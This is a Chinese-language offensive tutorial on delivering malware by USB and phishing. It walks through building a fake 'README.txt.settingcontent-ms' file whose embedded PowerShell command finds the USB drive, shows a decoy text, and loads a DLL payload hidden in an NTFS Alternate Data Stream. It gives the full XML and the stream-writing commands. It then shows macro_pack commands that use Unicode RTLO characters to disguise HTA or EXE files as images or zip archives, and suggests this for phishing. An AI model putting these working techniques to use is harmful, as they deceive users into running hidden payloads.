### 使用Alternate Data Streams隐藏并运行DLL载荷

由于`settingcontent-ms`文件遵循严格的XML规范，因此我们无法像处理HTA文件那样直接将其与恶意代码融合。为了解决这个问题，我们可以利用NTFS的Alternate Data Streams（ADS）来隐藏并执行DLL载荷。

具体来说，`settingcontent-ms`文件将执行隐藏在ADS中的DLL（例如`README.txt.settingcontent-ms:R`），同时通过记事本显示另一个ADS（例如`README.txt.settingcontent-ms:T.txt`）中的欺诈文本。与LNK或URI文件不同，`settingcontent-ms`文件不会在图标上显示快捷箭头，这使得它更加隐蔽。

### 构建欺诈文本
首先，创建一个简单的文本文件，用于在用户打开时展示内容。
```bash
echo "This is a simple README file." > Text.txt
```

### 构建恶意设置快捷方式文件
使用[macro_pack](https://github.com/sevagas/macro_pack)生成`settingcontent-ms`文件。例如，以下命令可以生成一个伪造的`README.txt`文件，该文件会启动计算器应用：
```bash
echo 'C:\Windows\system32\cmd.exe /c calc.exe' '.' | macro_pack.exe -G README.txt.settingcontent-ms
```
虽然弹出计算器是一个不错的演示，但我们的目标是运行隐藏的DLL载荷。为此，我们需要将DLL和欺诈文本隐藏在USB介质的NTFS文件系统的ADS中。主要问题在于`settingcontent-ms`文件默认在`C:\Windows\System32`目录下执行，因此需要找到一种方法来定位USB驱动器。

以下是实现这一目标的PowerShell命令：
```powershell
%windir%\system32\cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name; Start-Process "notepad.exe" "$drive\README.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$drive\README.txt.settingcontent-ms:R"
```
这条命令的具体操作如下：
1. 通过WMI获取USB卷名，并存储在`$drive`变量中。
2. 使用记事本打开`README.txt.settingcontent-ms:T.txt`中的欺诈文本。
3. 使用`control.exe`加载`README.txt.settingcontent-ms:R`中的DLL载荷。

最终生成的`README.txt.settingcontent-ms`文件内容如下：
```xml
<Settings xmlns="http://schemas.microsoft.com/Settings">
    <DefaultSetting>
        <Value>Windows.immersivecontrolpanel_cw5n1h2txyewy!Microsoft.Windows.ImmersiveControlPanel</Value>
        <CommandLine>%windir%\system32\cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name; Start-Process "notepad.exe" "$drive\README.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$drive\README.txt.settingcontent-ms:R"</CommandLine>
        <IconPath>%windir%\System32\shell32.dll,-4161</IconPath>
        <IconIndex>0</IconIndex>
        <Guid>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</Guid>
    </DefaultSetting>
</Settings>
```

### 创建Alternate Data Stream
确保USB介质已格式化为NTFS文件系统，然后将`README.txt.settingcontent-ms`文件移动到USB介质中。假设USB驱动器的卷标为“G:”。

接下来，创建包含DLL的ADS流：
```bash
type payload.dll > G:\README.txt.settingcontent-ms:R
```

再创建包含欺诈文本的ADS流：
```bash
type Text.txt > G:\README.txt.settingcontent-ms:T.txt
```

可以使用Sysinternals的“Streams”工具来验证这些ADS是否正确创建。

**注意：** 如果编辑并保存了USB介质上的`README.txt.settingcontent-ms`文件，则与之关联的ADS将丢失，需要重新执行上述命令。

### 测试
将制作好的U盘插入另一台Windows 10主机，双击“README.txt”。此时，DLL会被成功加载，并且记事本会自动打开，显示“This is a simple README file.”文本。

## 利用Unicode RTLO进行钓鱼攻击

### 目标系统
- MS Windows以及其他系统

### 主要原理
利用Unicode Right-To-Left Override (RTLO)字符来隐藏文件扩展名，使文件名看起来像是合法的文件类型。

### 利用策略
通过注入RTLO字符，可以构造带有欺诈扩展名的文件。例如，使用`macro_pack`生成一个带有伪造`.jpg`扩展名的HTA文件：
```bash
echo calc.exe | macro_pack.exe -t CMD -G calc.hta --unicode-rtlo=jpg
```

在资源管理器中，这个文件看起来像是`calcath.jpg`，但实际上其文件名为`calc[rtlo]gpj.hta`。

### 练习
可以通过多种方法利用Unicode RTLO实施钓鱼攻击。例如，将恶意的exe文件伪装成zip文件（更改文件图标，并使用RTLO方法使文件名看起来以`.zip`结尾）。当用户双击伪造的zip文件时，实际运行的是exe文件，并打开隐藏在文件资源区或ADS中的诱骗zip文件。

审核人：yiwang  
编辑：边边